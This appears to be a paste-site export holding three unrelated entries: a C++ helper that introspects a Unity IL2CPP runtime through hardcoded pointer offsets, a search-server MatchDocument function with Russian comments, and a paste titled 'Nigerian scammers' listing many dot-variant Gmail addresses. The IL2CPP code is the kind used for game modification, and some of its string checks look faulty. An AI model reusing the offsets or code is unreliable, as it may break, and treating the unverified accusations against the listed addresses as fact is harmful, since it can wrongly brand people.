	CREATE_TYPE(type_get_object, std::uintptr_t(*)(std::uintptr_t));
	CREATE_TYPE(method_get_return_type, const char* (*)(std::uintptr_t));

	inline void init() {
		ASSIGN_TYPE(domain_get);
		ASSIGN_TYPE(class_get_methods);
		ASSIGN_TYPE(method_get_param_count);
		ASSIGN_TYPE(assembly_get_image);
		ASSIGN_TYPE(domain_get_assemblies);
		ASSIGN_TYPE(object_new);
		ASSIGN_TYPE(class_from_name);
		ASSIGN_TYPE(resolve_icall);
		ASSIGN_TYPE(field_static_get_value);
		ASSIGN_TYPE(class_get_fields);
		ASSIGN_TYPE(field_get_offset);
		ASSIGN_TYPE(string_new_wrapper);
		ASSIGN_TYPE(class_get_type);
		ASSIGN_TYPE(type_get_object);
		ASSIGN_TYPE(method_get_return_type);
	}

	inline auto find_class(const char* name, const char* name_space = """") -> const std::uintptr_t {

		const auto domain = domain_get();

		std::uintptr_t assembly_count{ 0 };
		std::uintptr_t* assemblies;
		assemblies = domain_get_assemblies((void*)domain, &assembly_count);

		for (size_t idx{ 0 }; idx < assembly_count; idx++) {
			const auto img = assembly_get_image(assemblies[idx]);
			const auto kl = class_from_name(img, name_space, name);
			if (!kl)
				continue;

			return kl;
		}

		return 0;
	}

	inline auto type_object(const char* name_space, const char* name) -> const uintptr_t
	{
		auto klass = find_class(name, name_space);
		return type_get_object(class_get_type(klass));
	}

	// im sorry this is messy but its a lot cleaner in the end.
	inline auto sanitize_method_name(const std::string name) -> sanitized_method_t {
		std::string ns, kl, method_name;

		if (auto ns_break = name.find(""::""))
			ns = name.substr(0, ns_break);

		if (name.find(""::"") == std::string::npos)
			ns = """";

		if (name.find(""::"")) {
			kl = name.substr(name.find(""::"", 2) + 2);
			kl = kl.substr(0, kl.find(""."", 0));
		}

		if (name.find(""::"") == std::string::npos)
			kl = name.substr(0, name.find(""."", 0));

		method_name = name.substr(name.find(""."", 0) + 1);

		if (method_name.find(""()""))
			method_name.erase(method_name.find(""()""), 2);

		return { ns, kl, method_name };
	}

	inline auto method(const std::string name, int argument_number = -1, const char* arg_name = """", int selected_argument = -1) -> const std::uintptr_t {
		std::uintptr_t iter{};

		const auto st = sanitize_method_name(name);
		const auto klass = find_class(st.kl.c_str(), st.ns.c_str());

		while (auto method = class_get_methods(klass, &iter)) {

			const auto fn_name = *reinterpret_cast<const char**>(method + 0x10);

			if (utl::crt::string::strcmp(fn_name, st.mt.c_str())) {
				auto method_count = method_get_param_count(method);
				if (argument_number >= 0 && method_count != argument_number)
					continue;

				if (selected_argument >= 0 && arg_name) {
					auto args = *reinterpret_cast<std::uintptr_t*>(method + 0x28);

					if (selected_argument > method_count)
						continue;

					char* argname;

					if (method_count > 0)
						argname = *reinterpret_cast<char**>(args + (selected_argument - 1) * 0x18);
					else
						argname = (char*)(""-"");

					if (!argname || !utl::crt::string::strcmp(argname, arg_name))
						continue;
				}

				return method;
			}
		}

		return {};
	}

	inline auto field_internal(std::uintptr_t klass, const char* field_name, bool offset = true) -> const uintptr_t {
		auto iterator = std::uintptr_t();

		while (auto il2cpp_field = class_get_fields(klass, &iterator)) {

			const auto name = reinterpret_cast<const char*>(*reinterpret_cast<std::uintptr_t*>(il2cpp_field));
			if (!name) {
				break;
			}

			if (!utl::crt::string::strcmp(name, field_name)) {
				continue;
			}

			if (!offset) {
				return il2cpp_field;
			}

			return field_get_offset(il2cpp_field);
		}
		return 0;
	}

	inline auto field(const char* kl, const char* name, bool offset = true) -> const std::uintptr_t {

		const auto klass = find_class(kl);

		if (offset) {
			return field_internal(klass, name);
		}

		const auto _field = field_internal(klass, name, false);

		auto ret = std::uintptr_t();
		field_static_get_value(_field, &ret);
		return ret;
	}

};"
nkMuFqrA,MatchDocument,Alex_St,C++,Thursday 23rd of November 2023 02:38:01 PM CDT,"std::tuple<std::vector<std::string>, DocumentStatus> MatchDocument(
        const std::string& raw_query, 
        int document_id) const
    {
        const Query parced_query = ParseQuery(raw_query);

        std::set<std::string> temp_matched_words_storage;

        for(const auto& plus_word : parced_query.plus_words)
        {
            //если нашли плюс-слово из запроса в базе документов
            if(word_to_document_freqs_.count(plus_word)) 
            {
    
                //проходимся по всем номерам документов, в которых данное слово есть
                for(const auto& [doc_number, TF] : word_to_document_freqs_.at(plus_word))
                {
                    if(doc_number==document_id)
                    {
                        temp_matched_words_storage.insert(plus_word);
                    }
                }
            }
        }

        //избавляемся от документов, имеющих в своем составе минус-слова
        for(const auto& minus_word : parced_query.minus_words) 
        {
            //если заданное минус-слово есть в базе слов
            if(temp_matched_words_storage.count(minus_word)) 
            {
                return {{}, document_status_.at(document_id)};
            }
        }

        std::vector<std::string> temp_vect_result(temp_matched_words_storage.begin(), temp_matched_words_storage.end());
        std::sort(temp_vect_result.begin(), temp_vect_result.end());

        return {temp_vect_result, document_status_.at(document_id)};
    }"
XKRJd67J,Nigerian scammers [23-11-2/2023],bombaires,AIMMS,Thursday 23rd of November 2023 02:00:05 PM CDT,"<a href=""mailto:jeffmarks938@gmail.com"">jeffmarks938@gmail.com</a>
<a href=""mailto:jeff.m.a.r.k.s93.8@gmail.com"">jeff.m.a.r.k.s93.8@gmail.com</a>
<a href=""mailto:je.f.f.m.a.rks9.3.8@gmail.com"">je.f.f.m.a.rks9.3.8@gmail.com</a>
<a href=""mailto:j.e.f.f.ma.rk.s.9.38@gmail.com"">j.e.f.f.ma.rk.s.9.38@gmail.com</a>
<a href=""mailto:jef.f.ma.rk.s9.3.8@gmail.com"">jef.f.ma.rk.s9.3.8@gmail.com</a>
<a href=""mailto:jeff.ma.r.ks9.3.8@gmail.com"">jeff.ma.r.ks9.3.8@gmail.com</a>
<a href=""mailto:j.e.f.f.ma.rks.9.38@gmail.com"">j.e.f.f.ma.rks.9.38@gmail.com</a>
<a href=""mailto:je.f.f.m.ar.ks938@gmail.com"">je.f.f.m.ar.ks938@gmail.com</a>
<a href=""mailto:jef.f.m.ark.s.938@gmail.com"">jef.f.m.ark.s.938@gmail.com</a>
<a href=""mailto:je.ffmar.ks.93.8@gmail.com"">je.ffmar.ks.93.8@gmail.com</a>
<a href=""mailto:j.ef.fma.rks.9.38@gmail.com"">j.ef.fma.rks.9.38@gmail.com</a>
<a href=""mailto:j.e.f.f.ma.rk.s93.8@gmail.com"">j.e.f.f.ma.rk.s93.8@gmail.com</a>
<a href=""mailto:je.f.f.m.ar.k.s.93.8@gmail.com"">je.f.f.m.ar.k.s.93.8@gmail.com</a>
<a href=""mailto:j.e.ff.ma.rk.s.938@gmail.com"">j.e.ff.ma.rk.s.938@gmail.com</a>
<a href=""mailto:j.ef.f.marks.938@gmail.com"">j.ef.f.marks.938@gmail.com</a>
<a href=""mailto:je.ff.ma.r.ks.9.38@gmail.com"">je.ff.ma.r.ks.9.38@gmail.com</a>
<a href=""mailto:j.ef.fma.rks93.8@gmail.com"">j.ef.fma.rks93.8@gmail.com</a>
<a href=""mailto:jef.f.m.a.rks.9.3.8@gmail.com"">jef.f.m.a.rks.9.3.8@gmail.com</a>
<a href=""mailto:j.e.ff.ma.rks.93.8@gmail.com"">j.e.ff.ma.rks.93.8@gmail.com</a>
<a href=""mailto:j.e.f.f.m.a.rk.s.9.38@gmail.com"">j.e.f.f.m.a.rk.s.9.38@gmail.com</a>
<a href=""mailto:je.f.f.m.a.rks.93.8@gmail.com"">je.f.f.m.a.rks.93.8@gmail.com</a>
<a href=""mailto:je.f.fma.r.ks.9.38@gmail.com"">je.f.fma.r.ks.9.38@gmail.com</a>
<a href=""mailto:j.e.ffm.ar.ks9.3.8@gmail.com"">j.e.ffm.ar.ks9.3.8@gmail.com</a>
<a href=""mailto:j.e.f.f.ma.rks938@gmail.com"">j.e.f.f.ma.rks938@gmail.com</a>
<a href=""mailto:j.e.ff.mar.ks93.8@gmail.com"">j.e.ff.mar.ks93.8@gmail.com</a>
<a href=""mailto:je.ffm.a.r.ks9.38@gmail.com"">je.ffm.a.r.ks9.38@gmail.com</a>
<a href=""mailto:jef.fmar.ks938@gmail.com"">jef.fmar.ks938@gmail.com</a>
<a href=""mailto:jeff.ma.r.k.s9.38@gmail.com"">jeff.ma.r.k.s9.38@gmail.com</a>
<a href=""mailto:j.e.ffma.rk.s9.38@gmail.com"">j.e.ffma.rk.s9.38@gmail.com</a>
<a href=""mailto:je.ff.mark.s.93.8@gmail.com"">je.ff.mark.s.93.8@gmail.com</a>
<a href=""mailto:je.ff.mark.s938@gmail.com"">je.ff.mark.s938@gmail.com</a>
<a href=""mailto:je.f.fmarks9.38@gmail.com"">je.f.fmarks9.38@gmail.com</a>
<a href=""mailto:je.ffm.ark.s9.3.8@gmail.com"">je.ffm.ark.s9.3.8@gmail.com</a>
<a href=""mailto:jeff.m.a.r.ks.938@gmail.com"">jeff.m.a.r.ks.938@gmail.com</a>
<a href=""mailto:jeff.marks9.3.8@gmail.com"">jeff.marks9.3.8@gmail.com</a>
<a href=""mailto:j.e.ffm.arks93.8@gmail.com"">j.e.ffm.arks93.8@gmail.com</a>
<a href=""mailto:je.ffm.a.r.k.s9.3.8@gmail.com"">je.ffm.a.r.k.s9.3.8@gmail.com</a>
<a href=""mailto:jeffm.ar.ks.938@gmail.com"">jeffm.ar.ks.938@gmail.com</a>
<a href=""mailto:jef.f.marks9.38@gmail.com"">jef.f.marks9.38@gmail.com</a>
<a href=""mailto:j.effma.rks93.8@gmail.com"">j.effma.rks93.8@gmail.com</a>
<a href=""mailto:jeff.mar.ks93.8@gmail.com"">jeff.mar.ks93.8@gmail.com</a>
<a href=""mailto:j.ef.fm.a.r.ks9.3.8@gmail.com"">j.ef.fm.a.r.ks9.3.8@gmail.com</a>
<a href=""mailto:j.ef.f.m.ark.s.938@gmail.com"">j.ef.f.m.ark.s.938@gmail.com</a>
<a href=""mailto:jef.fma.rk.s.93.8@gmail.com"">jef.fma.rk.s.93.8@gmail.com</a>
<a href=""mailto:je.ff.m.ar.ks.9.38@gmail.com"">je.ff.m.ar.ks.9.38@gmail.com</a>
<a href=""mailto:jef.f.ma.r.ks9.38@gmail.com"">jef.f.ma.r.ks9.38@gmail.com</a>
<a href=""mailto:j.e.ff.m.ar.ks9.3.8@gmail.com"">j.e.ff.m.ar.ks9.3.8@gmail.com</a>
<a href=""mailto:j.e.ff.m.arks9.38@gmail.com"">j.e.ff.m.arks9.38@gmail.com</a>
<a href=""mailto:j.e.ffm.a.r.k.s9.3.8@gmail.com"">j.e.ffm.a.r.k.s9.3.8@gmail.com</a>
<a href=""mailto:j.eff.marks93.8@gmail.com"">j.eff.marks93.8@gmail.com</a>
<a href=""mailto:je.ffmarks.9.3.8@gmail.com"">je.ffmarks.9.3.8@gmail.com</a>
<a href=""mailto:jef.f.m.ark.s.9.38@gmail.com"">jef.f.m.ark.s.9.38@gmail.com</a>
<a href=""mailto:je.ff.m.a.rks.93.8@gmail.com"">je.ff.m.a.rks.93.8@gmail.com</a>
<a href=""mailto:j.effma.r.k.s.9.3.8@gmail.com"">j.effma.r.k.s.9.3.8@gmail.com</a>
<a href=""mailto:jeffm.ar.ks9.38@gmail.com"">jeffm.ar.ks9.38@gmail.com</a>
<a href=""mailto:j.effma.r.k.s938@gmail.com"">j.effma.r.k.s938@gmail.com</a>
<a href=""mailto:jef.fmark.s93.8@gmail.com"">jef.fmark.s93.8@gmail.com</a>
<a href=""mailto:je.f.f.m.a.rk.s938@gmail.com"">je.f.f.m.a.rk.s938@gmail.com</a>
<a href=""mailto:j.e.f.fmark.s9.3.8@gmail.com"">j.e.f.fmark.s9.3.8@gmail.com</a>
<a href=""mailto:jeff.ma.r.k.s938@gmail.com"">jeff.ma.r.k.s938@gmail.com</a>
<a href=""mailto:j.e.ff.ma.rk.s.93.8@gmail.com"">j.e.ff.ma.rk.s.93.8@gmail.com</a>
<a href=""mailto:j.e.f.f.m.a.r.k.s.9.38@gmail.com"">j.e.f.f.m.a.r.k.s.9.38@gmail.com</a>
<a href=""mailto:j.e.ff.mar.k.s938@gmail.com"">j.e.ff.mar.k.s938@gmail.com</a>
<a href=""mailto:j.e.ffmarks9.3.8@gmail.com"">j.e.ffmarks9.3.8@gmail.com</a>
<a href=""mailto:j.ef.fm.ark.s.9.3.8@gmail.com"">j.ef.fm.ark.s.9.3.8@gmail.com</a>
<a href=""mailto:je.ffm.a.r.ks.9.3.8@gmail.com"">je.ffm.a.r.ks.9.3.8@gmail.com</a>
<a href=""mailto:j.e.ffm.ark.s.93.8@gmail.com"">j.e.ffm.ark.s.93.8@gmail.com</a>
<a href=""mailto:je.ff.ma.r.k.s.9.3.8@gmail.com"">je.ff.ma.r.k.s.9.3.8@gmail.com</a>
<a href=""mailto:jef.f.m.ar.k.s.9.38@gmail.com"">jef.f.m.ar.k.s.9.38@gmail.com</a>
<a href=""mailto:j.ef.f.m.ar.k.s93.8@gmail.com"">j.ef.f.m.ar.k.s93.8@gmail.com</a>
<a href=""mailto:j.ef.fma.rks.9.3.8@gmail.com"">j.ef.fma.rks.9.3.8@gmail.com</a>
<a href=""mailto:je.ff.ma.r.ks.93.8@gmail.com"">je.ff.ma.r.ks.93.8@gmail.com</a>
<a href=""mailto:je.f.f.m.arks.9.38@gmail.com"">je.f.f.m.arks.9.38@gmail.com</a>
<a href=""mailto:jeffm.a.rk.s93.8@gmail.com"">jeffm.a.rk.s93.8@gmail.com</a>
<a href=""mailto:j.e.f.fm.a.r.ks9.38@gmail.com"">j.e.f.fm.a.r.ks9.38@gmail.com</a>
<a href=""mailto:je.ffmar.k.s.93.8@gmail.com"">je.ffmar.k.s.93.8@gmail.com</a>
<a href=""mailto:j.e.ff.m.ark.s9.3.8@gmail.com"">j.e.ff.m.ark.s9.3.8@gmail.com</a>
<a href=""mailto:j.e.f.fmarks938@gmail.com"">j.e.f.fmarks938@gmail.com</a>
<a href=""mailto:j.ef.fm.ar.k.s.9.3.8@gmail.com"">j.ef.fm.ar.k.s.9.3.8@gmail.com</a>
<a href=""mailto:j.eff.mar.ks938@gmail.com"">j.eff.mar.ks938@gmail.com</a>
<a href=""mailto:j.eff.m.a.r.k.s9.38@gmail.com"">j.eff.m.a.r.k.s9.38@gmail.com</a>
<a href=""mailto:j.e.f.fmark.s.938@gmail.com"">j.e.f.fmark.s.938@gmail.com</a>
<a href=""mailto:jef.f.ma.rk.s.93.8@gmail.com"">jef.f.ma.rk.s.93.8@gmail.com</a>
<a href=""mailto:j.e.f.f.marks.9.3.8@gmail.com"">j.e.f.f.marks.9.3.8@gmail.com</a>
<a href=""mailto:je.ffma.r.ks9.38@gmail.com"">je.ffma.r.ks9.38@gmail.com</a>
<a href=""mailto:jef.fm.ar.k.s.93.8@gmail.com"">jef.fm.ar.k.s.93.8@gmail.com</a>
<a href=""mailto:j.e.f.f.mar.k.s.93.8@gmail.com"">j.e.f.f.mar.k.s.93.8@gmail.com</a>
<a href=""mailto:j.ef.f.ma.r.k.s9.38@gmail.com"">j.ef.f.ma.r.k.s9.38@gmail.com</a>
<a href=""mailto:j.e.ff.m.ar.k.s.9.38@gmail.com"">j.e.ff.m.ar.k.s.9.38@gmail.com</a>
<a href=""mailto:jeff.mark.s.938@gmail.com"">jeff.mark.s.938@gmail.com</a>
<a href=""mailto:j.eff.mark.s.93.8@gmail.com"">j.eff.mark.s.93.8@gmail.com</a>
<a href=""mailto:je.ffm.a.rk.s.93.8@gmail.com"">je.ffm.a.rk.s.93.8@gmail.com</a>
<a href=""mailto:jef.fmar.ks.9.38@gmail.com"">jef.fmar.ks.9.38@gmail.com</a>
<a href=""mailto:je.f.fm.a.rk.s.938@gmail.com"">je.f.fm.a.rk.s.938@gmail.com</a>
<a href=""mailto:jeffm.arks9.3.8@gmail.com"">jeffm.arks9.3.8@gmail.com</a>
<a href=""mailto:je.f.fma.rk.s.9.38@gmail.com"">je.f.fma.rk.s.9.38@gmail.com</a>
<a href=""mailto:jeffmar.k.s938@gmail.com"">jeffmar.k.s938@gmail.com</a>
<a href=""mailto:jef.f.m.ar.k.s93.8@gmail.com"">jef.f.m.ar.k.s93.8@gmail.com</a>
<a href=""mailto:j.ef.fma.r.k.s9.3.8@gmail.com"">j.ef.fma.r.k.s9.3.8@gmail.com</a>
<a href=""mailto:jef.f.ma.rk.s9.38@gmail.com"">jef.f.ma.rk.s9.38@gmail.com</a>
<a href=""mailto:j.effmark.s.9.38@gmail.com"">j.effmark.s.9.38@gmail.com</a>
<a href=""mailto:je.ff.m.arks.9.38@gmail.com"">je.ff.m.arks.9.38@gmail.com</a>
<a href=""mailto:j.e.ffm.a.r.k.s93.8@gmail.com"">j.e.ffm.a.r.k.s93.8@gmail.com</a>
<a href=""mailto:jeffma.r.k.s9.38@gmail.com"">jeffma.r.k.s9.38@gmail.com</a>
<a href=""mailto:j.e.f.fm.a.rk.s93.8@gmail.com"">j.e.f.fm.a.rk.s93.8@gmail.com</a>
<a href=""mailto:j.ef.fm.ar.ks9.3.8@gmail.com"">j.ef.fm.ar.ks9.3.8@gmail.com</a>
<a href=""mailto:j.e.f.fmarks9.38@gmail.com"">j.e.f.fmarks9.38@gmail.com</a>
<a href=""mailto:jeff.m.ark.s9.38@gmail.com"">jeff.m.ark.s9.38@gmail.com</a>
<a href=""mailto:j.e.ff.ma.rk.s93.8@gmail.com"">j.e.ff.ma.rk.s93.8@gmail.com</a>
<a href=""mailto:j.e.f.fm.ar.k.s.9.38@gmail.com"">j.e.f.fm.ar.k.s.9.38@gmail.com</a>
<a href=""mailto:jef.fm.a.rks938@gmail.com"">jef.fm.a.rks938@gmail.com</a>
<a href=""mailto:je.f.fm.a.rks9.3.8@gmail.com"">je.f.fm.a.rks9.3.8@gmail.com</a>
<a href=""mailto:j.ef.f.m.ark.s93.8@gmail.com"">j.ef.f.m.ark.s93.8@gmail.com</a>
<a href=""mailto:jeff.ma.rk.s93.8@gmail.com"">jeff.ma.rk.s93.8@gmail.com</a>
<a href=""mailto:je.ff.ma.rk.s9.38@gmail.com"">je.ff.ma.rk.s9.38@gmail.com</a>
<a href=""mailto:j.ef.f.m.a.rk.s.93.8@gmail.com"">j.ef.f.m.a.rk.s.93.8@gmail.com</a>
<a href=""mailto:j.e.f.f.m.ar.ks.938@gmail.com"">j.e.f.f.m.ar.ks.938@gmail.com</a>
<a href=""mailto:j.e.f.f.m.arks.9.38@gmail.com"">j.e.f.f.m.arks.9.38@gmail.com</a>
<a href=""mailto:j.ef.f.mar.ks938@gmail.com"">j.ef.f.mar.ks938@gmail.com</a>
<a href=""mailto:j.e.f.fmar.ks9.38@gmail.com"">j.e.f.fmar.ks9.38@gmail.com</a>
<a href=""mailto:jeff.m.a.rk.s.9.38@gmail.com"">jeff.m.a.rk.s.9.38@gmail.com</a>
<a href=""mailto:je.ffma.rks9.3.8@gmail.com"">je.ffma.rks9.3.8@gmail.com</a>
<a href=""mailto:j.e.ff.mar.ks.93.8@gmail.com"">j.e.ff.mar.ks.93.8@gmail.com</a>
<a href=""mailto:j.ef.fm.a.r.ks.9.38@gmail.com"">j.ef.fm.a.r.ks.9.38@gmail.com</a>
<a href=""mailto:j.e.ff.ma.r.ks.9.38@gmail.com"">j.e.ff.ma.r.ks.9.38@gmail.com</a>
<a href=""mailto:j.e.f.fma.r.ks9.3.8@gmail.com"">j.e.f.fma.r.ks9.3.8@gmail.com</a>
<a href=""mailto:j.ef.fmark.s.93.8@gmail.com"">j.ef.fmark.s.93.8@gmail.com</a>
<a href=""mailto:j.e.f.fm.a.r.k.s9.3.8@gmail.com"">j.e.f.fm.a.r.k.s9.3.8@gmail.com</a>
<a href=""mailto:jef.fm.ar.ks.93.8@gmail.com"">jef.fm.ar.ks.93.8@gmail.com</a>
<a href=""mailto:j.e.f.fm.arks938@gmail.com"">j.e.f.fm.arks938@gmail.com</a>
<a href=""mailto:jef.f.mark.s938@gmail.com"">jef.f.mark.s938@gmail.com</a>
<a href=""mailto:jeffma.rk.s9.38@gmail.com"">jeffma.rk.s9.38@gmail.com</a>
<a href=""mailto:jeff.ma.r.ks9.38@gmail.com"">jeff.ma.r.ks9.38@gmail.com</a>
<a href=""mailto:jef.f.m.a.r.k.s9.3.8@gmail.com"">jef.f.m.a.r.k.s9.3.8@gmail.com</a>
<a href=""mailto:je.ffmar.k.s9.3.8@gmail.com"">je.ffmar.k.s9.3.8@gmail.com</a>
<a href=""mailto:j.e.ff.ma.r.k.s.93.8@gmail.com"">j.e.ff.ma.r.k.s.93.8@gmail.com</a>
<a href=""mailto:je.f.fm.a.rks.9.38@gmail.com"">je.f.fm.a.rks.9.38@gmail.com</a>
<a href=""mailto:j.effm.ark.s.9.3.8@gmail.com"">j.effm.ark.s.9.3.8@gmail.com</a>
<a href=""mailto:j.e.ff.mar.k.s9.3.8@gmail.com"">j.e.ff.mar.k.s9.3.8@gmail.com</a>
<a href=""mailto:j.ef.f.m.a.r.k.s938@gmail.com"">j.ef.f.m.a.r.k.s938@gmail.com</a>
<a href=""mailto:jef.f.m.arks9.38@gmail.com"">jef.f.m.arks9.38@gmail.com</a>
<a href=""mailto:je.f.f.m.a.rk.s.9.3.8@gmail.com"">je.f.f.m.a.rk.s.9.3.8@gmail.com</a>
<a href=""mailto:je.f.fmark.s9.38@gmail.com"">je.f.fmark.s9.38@gmail.com</a>
<a href=""mailto:jeff.ma.r.k.s.93.8@gmail.com"">jeff.ma.r.k.s.93.8@gmail.com</a>
<a href=""mailto:j.ef.fma.r.k.s.938@gmail.com"">j.ef.fma.r.k.s.938@gmail.com</a>
<a href=""mailto:jeffm.ar.ks938@gmail.com"">jeffm.ar.ks938@gmail.com</a>
<a href=""mailto:j.e.ff.mark.s9.38@gmail.com"">j.e.ff.mark.s9.38@gmail.com</a>
<a href=""mailto:je.ff.ma.rks.9.38@gmail.com"">je.ff.ma.rks.9.38@gmail.com</a>
<a href=""mailto:j.ef.f.ma.rks.938@gmail.com"">j.ef.f.ma.rks.938@gmail.com</a>
<a href=""mailto:jeff.m.ar.ks938@gmail.com"">jeff.m.ar.ks938@gmail.com</a>
<a href=""mailto:jeff.m.ar.ks93.8@gmail.com"">jeff.m.ar.ks93.8@gmail.com</a>
<a href=""mailto:j.eff.m.a.rks93.8@gmail.com"">j.eff.m.a.rks93.8@gmail.com</a>
<a href=""mailto:jef.f.ma.rk.s.9.3.8@gmail.com"">jef.f.ma.rk.s.9.3.8@gmail.com</a>
<a href=""mailto:je.ff.m.ark.s9.3.8@gmail.com"">je.ff.m.ark.s9.3.8@gmail.com</a>
<a href=""mailto:jef.f.ma.r.ks938@gmail.com"">jef.f.ma.r.ks938@gmail.com</a>
<a href=""mailto:je.f.fm.a.r.k.s9.38@gmail.com"">je.f.fm.a.r.k.s9.38@gmail.com</a>
<a href=""mailto:j.e.f.f.marks93.8@gmail.com"">j.e.f.f.marks93.8@gmail.com</a>
<a href=""mailto:jeff.mar.ks.938@gmail.com"">jeff.mar.ks.938@gmail.com</a>
<a href=""mailto:je.ffm.a.rks.938@gmail.com"">je.ffm.a.rks.938@gmail.com</a>
<a href=""mailto:jef.fm.ark.s.938@gmail.com"">jef.fm.ark.s.938@gmail.com</a>
<a href=""mailto:j.e.f.f.m.arks.938@gmail.com"">j.e.f.f.m.arks.938@gmail.com</a>
<a href=""mailto:j.e.ff.m.arks938@gmail.com"">j.e.ff.m.arks938@gmail.com</a>
<a href=""mailto:je.ff.m.ar.ks.938@gmail.com"">je.ff.m.ar.ks.938@gmail.com</a>
<a href=""mailto:jef.fm.a.r.k.s.93.8@gmail.com"">jef.fm.a.r.k.s.93.8@gmail.com</a>
<a href=""mailto:jeffm.a.r.ks.93.8@gmail.com"">jeffm.a.r.ks.93.8@gmail.com</a>
<a href=""mailto:j.ef.fma.r.k.s938@gmail.com"">j.ef.fma.r.k.s938@gmail.com</a>
<a href=""mailto:j.eff.ma.rks.9.3.8@gmail.com"">j.eff.ma.rks.9.3.8@gmail.com</a>
<a href=""mailto:je.ffm.a.rks.9.38@gmail.com"">je.ffm.a.rks.9.38@gmail.com</a>
<a href=""mailto:j.effmar.k.s.9.38@gmail.com"">j.effmar.k.s.9.38@gmail.com</a>
<a href=""mailto:je.ff.marks.938@gmail.com"">je.ff.marks.938@gmail.com</a>
<a href=""mailto:j.eff.m.ark.s9.3.8@gmail.com"">j.eff.m.ark.s9.3.8@gmail.com</a>
<a href=""mailto:jef.fm.ar.ks93.8@gmail.com"">jef.fm.ar.ks93.8@gmail.com</a>
<a href=""mailto:jef.fm.ark.s.9.38@gmail.com"">jef.fm.ark.s.9.38@gmail.com</a>
<a href=""mailto:je.ff.m.ar.k.s9.38@gmail.com"">je.ff.m.ar.k.s9.38@gmail.com</a>
<a href=""mailto:je.f.f.ma.rks.938@gmail.com"">je.f.f.ma.rks.938@gmail.com</a>
<a href=""mailto:j.e.f.fm.a.rks9.38@gmail.com"">j.e.f.fm.a.rks9.38@gmail.com</a>
<a href=""mailto:jef.f.ma.r.ks9.3.8@gmail.com"">jef.f.ma.r.ks9.3.8@gmail.com</a>
<a href=""mailto:j.e.f.f.m.a.r.k.s.938@gmail.com"">j.e.f.f.m.a.r.k.s.938@gmail.com</a>
<a href=""mailto:je.ffm.a.r.k.s.9.38@gmail.com"">je.ffm.a.r.k.s.9.38@gmail.com</a>
<a href=""mailto:je.f.fma.rk.s.938@gmail.com"">je.f.fma.rk.s.938@gmail.com</a>
<a href=""mailto:jef.fmar.k.s9.3.8@gmail.com"">jef.fmar.k.s9.3.8@gmail.com</a>
<a href=""mailto:jef.f.ma.rks93.8@gmail.com"">jef.f.ma.rks93.8@gmail.com</a>
<a href=""mailto:je.ffmarks938@gmail.com"">je.ffmarks938@gmail.com</a>
<a href=""mailto:j.ef.fm.arks938@gmail.com"">j.ef.fm.arks938@gmail.com</a>
<a href=""mailto:jef.f.m.ark.s9.38@gmail.com"">jef.f.m.ark.s9.38@gmail.com</a>
<a href=""mailto:j.e.ff.m.ar.k.s9.3.8@gmail.com"">j.e.ff.m.ar.k.s9.3.8@gmail.com</a>
<a href=""mailto:je.ff.m.ark.s9.38@gmail.com"">je.ff.m.ark.s9.38@gmail.com</a>
<a href=""mailto:j.eff.ma.rks.9.38@gmail.com"">j.eff.ma.rks.9.38@gmail.com</a>
<a href=""mailto:jeff.m.ar.ks.938@gmail.com"">jeff.m.ar.ks.938@gmail.com</a>
<a href=""mailto:je.ffm.ar.ks9.38@gmail.com"">je.ffm.ar.ks9.38@gmail.com</a>
<a href=""mailto:je.f.f.mark.s.9.38@gmail.com"">je.f.f.mark.s.9.38@gmail.com</a>
<a href=""mailto:j.e.f.f.ma.rks.93.8@gmail.com"">j.e.f.f.ma.rks.93.8@gmail.com</a>
<a href=""mailto:je.ffm.a.r.ks.938@gmail.com"">je.ffm.a.r.ks.938@gmail.com</a>
<a href=""mailto:j.effm.ark.s938@gmail.com"">j.effm.ark.s938@gmail.com</a>
<a href=""mailto:jeffm.ar.k.s93.8@gmail.com"">jeffm.ar.k.s93.8@gmail.com</a>
<a href=""mailto:j.e.f.fmarks.9.38@gmail.com"">j.e.f.fmarks.9.38@gmail.com</a>
<a href=""mailto:jef.f.m.ar.k.s.938@gmail.com"">jef.f.m.ar.k.s.938@gmail.com</a>
<a href=""mailto:j.e.ffma.r.ks938@gmail.com"">j.e.ffma.r.ks938@gmail.com</a>
<a href=""mailto:je.f.f.m.a.r.ks9.3.8@gmail.com"">je.f.f.m.a.r.ks9.3.8@gmail.com</a>
<a href=""mailto:je.ffma.r.k.s938@gmail.com"">je.ffma.r.k.s938@gmail.com</a>
<a href=""mailto:jeffm.a.rks.9.38@gmail.com"">jeffm.a.rks.9.38@gmail.com</a>
<a href=""mailto:usacustomoffice03@gmail.com"">usacustomoffice03@gmail.com</a>
<a href=""mailto:usacu.stom.o.f.f.i.c.e.0.3@gmail.com"">usacu.stom.o.f.f.i.c.e.0.3@gmail.com</a>
<a href=""mailto:u.s.ac.us.tom.of.f.i.c.e.03@gmail.com"">u.s.ac.us.tom.of.f.i.c.e.03@gmail.com</a>
<a href=""mailto:usac.u.sto.mo.ff.ic.e0.3@gmail.com"">usac.u.sto.mo.ff.ic.e0.3@gmail.com</a>
<a href=""mailto:us.a.cu.s.to.mo.ffi.ce0.3@gmail.com"">us.a.cu.s.to.mo.ffi.ce0.3@gmail.com</a>
<a href=""mailto:u.s.a.cu.s.t.om.of.fic.e.0.3@gmail.com"">u.s.a.cu.s.t.om.of.fic.e.0.3@gmail.com</a>
<a href=""mailto:usac.us.t.o.m.o.f.f.i.ce0.3@gmail.com"">usac.us.t.o.m.o.f.f.i.ce0.3@gmail.com</a>
<a href=""mailto:u.sa.cus.t.om.of.fi.ce03@gmail.com"">u.sa.cus.t.om.of.fi.ce03@gmail.com</a>
<a href=""mailto:u.s.a.c.us.t.o.mo.f.f.ic.e0.3@gmail.com"">u.s.a.c.us.t.o.mo.f.f.ic.e0.3@gmail.com</a>
<a href=""mailto:usa.custo.m.o.ff.ice.03@gmail.com"">usa.custo.m.o.ff.ice.03@gmail.com</a>
<a href=""mailto:us.a.c.u.s.tomo.ffic.e.03@gmail.com"">us.a.c.u.s.tomo.ffic.e.03@gmail.com</a>
<a href=""mailto:u.s.a.cu.s.tomo.f.fice.03@gmail.com"">u.s.a.cu.s.tomo.f.fice.03@gmail.com</a>
<a href=""mailto:u.s.ac.us.t.omo.f.f.ic.e.03@gmail.com"">u.s.ac.us.t.omo.f.f.ic.e.03@gmail.com</a>
<a href=""mailto:us.a.c.us.tom.o.f.fice03@gmail.com"">us.a.c.us.tom.o.f.fice03@gmail.com</a>
<a href=""mailto:us.acus.t.o.mof.f.ic.e.0.3@gmail.com"">us.acus.t.o.mof.f.ic.e.0.3@gmail.com</a>
<a href=""mailto:usa.cus.tom.o.ffice03@gmail.com"">usa.cus.tom.o.ffice03@gmail.com</a>
